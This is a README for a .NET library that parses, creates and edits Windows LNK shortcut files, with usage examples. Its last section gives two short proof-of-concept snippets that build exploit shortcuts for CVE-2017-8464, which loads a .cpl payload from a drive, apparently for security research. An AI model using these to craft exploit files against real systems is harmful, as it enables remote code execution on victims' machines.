# ShellLink
A .NET Class Library for processing ShellLink (LNK) files as documented in [MS-SHLLINK](https://msdn.microsoft.com/en-us/library/dd871305.aspx). It allows for reading, creating and modifying ShellLink (LNK) files.

Note this Class Library depends on the [PropertyStore](https://github.com/securifybv/PropertyStore) Class Library.

![.NET Core](https://github.com/securifybv/ShellLink/workflows/.NET%20Core/badge.svg)

## Examples

### Dump
```
Console.WriteLine(
	Shortcut.ReadFromFile(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Paint.lnk")
);
```

#### Sample Output
```
Shortcut:
HeaderSize: 76 (0x4C)
LinkCLSID: 00021401-0000-0000-c000-000000000046
LinkFlags: HasName, HasIconLocation, IsUnicode, ForceNoLinkInfo, HasExpString, EnableTargetMetadata, PreferEnvironmentPath
FileAttributes: 0
CreationTime: 1/1/1601 12:00:00 AM
AccessTime: 1/1/1601 12:00:00 AM
WriteTime: 1/1/1601 12:00:00 AM
FileSize: 0 (0x0)
IconIndex: 0
ShowCommand: SW_SHOWNORMAL
HotKey: 0
StringData:
NameString: @%SystemRoot%\system32\shell32.dll,-22566
IconLocation: %windir%\system32\mspaint.exe
ExtraData:
EnvironmentVariableDataBlock:
BlockSize: 788 (0x314)
BlockSignature: 0xA0000001
TargetAnsi: %windir%\system32\mspaint.exe
TargetUnicode: %windir%\system32\mspaint.exe
PropertyStoreDataBlock:
BlockSize: 102 (0x66)
BlockSignature: 0xA0000009
SerializedPropertyStorage:
StorageSize: 45 (0x2D)
Version: 0x53505331
FormatID: 46588ae2-4cbc-4338-bbfc-139326986dce
IntegerName:
ValueSize: 17 (0x11)
ID: 0x0
TypedPropertyValue:
Type: VT_UI4
Value: 0
SerializedPropertyStorage:
StorageSize: 45 (0x2D)
Version: 0x53505331
FormatID: 9f4c2855-9f79-4b39-a8d0-e1d42de1d5f3
IntegerName:
ValueSize: 17 (0x11)
ID: 0x12
TypedPropertyValue:
Type: VT_UI4
Value: 1
```

### Create
```
Shortcut.CreateShortcut(@"%SystemRoot%\System32\calc.exe")
	.WriteToFile(@"calc.lnk");
```

```
Shortcut.CreateShortcut(@"%SystemRoot%\System32\cmd.exe", 
	"/c calc.exe", 
	@"%SystemRoot%\System32\calc.exe", 0)
		.WriteToFile(@"calc2.lnk");
```

```
new Shortcut()
{
	LinkTargetIDList = new LinkTargetIDList()
	{
		Path = @"C:\Windows\System32\calc.exe"
	}
}.WriteToFile(@"calc3.lnk");
```

### Modify
```
Shortcut PowerShellLnk = Shortcut.ReadFromFile(
	Environment.ExpandEnvironmentVariables(@"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk")
);
// change the background color
PowerShellLnk.ExtraData.ConsoleDataBlock.FillAttributes &= ~FillAttributes.BACKGROUND_BLUE;
PowerShellLnk.WriteToFile(@"PowerShell.lnk");
```

### CVE-2017-8464 | LNK Remote Code Execution Vulnerability

#### SpecialFolderDataBlock
```
Shortcut poc = new Shortcut()
{
	IconIndex = 0,
	LinkFlags = LinkFlags.IsUnicode,
	LinkTargetIDList = new CplLinkTargetIDList(@"E:\target.cpl"),
};
int Index = poc.LinkTargetIDList.ItemIDList.Count - 1;
poc.ExtraData.SpecialFolderDataBlock = new SpecialFolderDataBlock()
{
	SpecialFolderID = CSIDL.CSIDL_CONTROLS,
	Offset = poc.LinkTargetIDList.GetOffsetByIndex(Index)
};
poc.WriteToFile(@"CVE-2017-8464.lnk");
```

#### KnownFolderDataBlock
```
Shortcut poc2 = new Shortcut()
{
	IconIndex = 0,
	LinkFlags = LinkFlags.IsUnicode,
	LinkTargetIDList = new CplLinkTargetIDList(@"E:\target.cpl")
};
int Index = poc2.LinkTargetIDList.ItemIDList.Count - 1;
poc2.ExtraData.KnownFolderDataBlock = new KnownFolderDataBlock()
{
	KnownFolderID = KNOWNFOLDERID.FOLDERID_ControlPanelFolder,
	Offset = poc2.LinkTargetIDList.GetOffsetByIndex(Index)
};
poc2.WriteToFile(@"CVE-2017-8464-2.lnk");
```
